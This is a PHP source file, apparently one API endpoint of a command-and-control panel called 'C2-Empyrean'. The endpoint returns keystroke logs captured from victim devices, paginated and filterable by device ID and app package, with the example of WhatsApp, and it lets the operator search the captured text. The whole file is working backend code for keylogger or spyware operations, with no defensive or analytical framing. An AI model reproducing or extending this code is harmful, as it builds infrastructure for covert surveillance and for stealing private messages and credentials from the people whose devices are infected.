<?php
/**
 * C2-Empyrean - API: Fetch Keylogs
 * GET /api/keylogs/fetch?device_id=xxx&page=1&per_page=50&app=com.whatsapp&search=keyword
 */

$middleware->requireAuth();

$deviceId = $_GET['device_id'] ?? null;
$page = max(1, (int)($_GET['page'] ?? 1));
$perPage = min(200, max(1, (int)($_GET['per_page'] ?? 50)));
$appFilter = $_GET['app'] ?? null;
$search = $_GET['search'] ?? null;

$keylogs = $db->read('keylogs');

// Filter by device
if ($deviceId) {
    $keylogs = array_filter($keylogs, fn($k) => ($k['device_id'] ?? '') === $deviceId);
}

// Filter by app
if ($appFilter) {
    $keylogs = array_filter($keylogs, fn($k) => strpos($k['package_name'] ?? '', $appFilter) !== false);
}

// Search in captured text
if ($search) {
    $search = strtolower($search);
    $keylogs = array_filter($keylogs, fn($k) => strpos(strtolower($k['text'] ?? ''), $search) !== false);
}

// Sort by newest first
usort($keylogs, fn($a, $b) => ($b['timestamp'] ?? 0) <=> ($a['timestamp'] ?? 0));

$total = count($keylogs);
$totalPages = ceil($total / $perPage);
$offset = ($page - 1) * $perPage;
$items = array_slice(array_values($keylogs), $offset, $perPage);

// Get unique apps for filter dropdown
$allLogs = $db->read('keylogs');
$uniqueApps = [];
foreach ($allLogs as $log) {
    $pkg = $log['package_name'] ?? 'unknown';
    if (!in_array($pkg, $uniqueApps)) $uniqueApps[] = $pkg;
}
sort($uniqueApps);

echo json_encode([
    'success' => true,
    'data' => [
        'keylogs' => $items,
        'pagination' => [
            'page' => $page, 'per_page' => $perPage,
            'total' => $total, 'pages' => $totalPages,
        ],
        'filters' => [
            'available_apps' => $uniqueApps,
        ],
    ],
]);
